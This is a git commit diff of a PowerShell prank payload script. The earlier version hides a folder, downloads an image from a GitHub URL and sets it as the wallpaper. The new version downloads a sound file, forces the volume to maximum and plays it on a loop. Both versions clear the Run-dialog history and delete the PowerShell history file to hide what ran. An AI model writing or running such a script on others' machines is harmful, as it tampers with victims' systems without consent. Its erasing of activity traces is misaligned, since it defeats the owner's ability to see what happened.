9513731a2fec0d869ed4b38c47f6c6e26db034be
Noshbit <93923548+Noshbit@users.noreply.github.com>
2021-11-09 10:37:41 +0100

    Update 1.ps1

--- 1.ps1
+++ 1.ps1
@@ -1,3 +1,16 @@
-attrib +s +h "$env:USERPROFILE\temp"; iwr "https://raw.githubusercontent.com/Noshbit/miniature-octo-carnival/main/d.jpg" -outfile "$env:USERPROFILE\temp\a.jpg"; sp 'HKCU:Control Panel\Desktop' Wallpaper "$env:USERPROFILE\temp\a.jpg"; 1..59 | % {RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters -windowstyle hidden; $i; $i++};
-rm "$env:userprofile\temp\1.ps1";
+attrib +s +h "$env:USERPROFILE\temp"; iwr "https://raw.githubusercontent.com/Noshbit/miniature-octo-carnival/main/S.wav" -outfile "$env:USERPROFILE\temp\S.wav"; 
+$player = New-Object System.Media.SoundPlayer "$env:userprofile\temp\S.wav"
+Function Set-SpeakerVolume
+{ Param (
+  [switch]$min,
+  [switch]$max)
+  $wshShell = new-object -com wscript.shell
+  If ($min)
+  {1..50 | % {$wshShell.SendKeys([char]174)}}
+  ElseIf ($max)
+  {1..50 | % {$wshShell.SendKeys([char]175)}}
+  Else
+  {$wshShell.SendKeys([char]173)} }
+Set-SpeakerVolume -Max
+$player.PlayLooping();
 Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue; $pshist = Get-PSReadlineOption | select -expand historysavepath; rm $pshist;
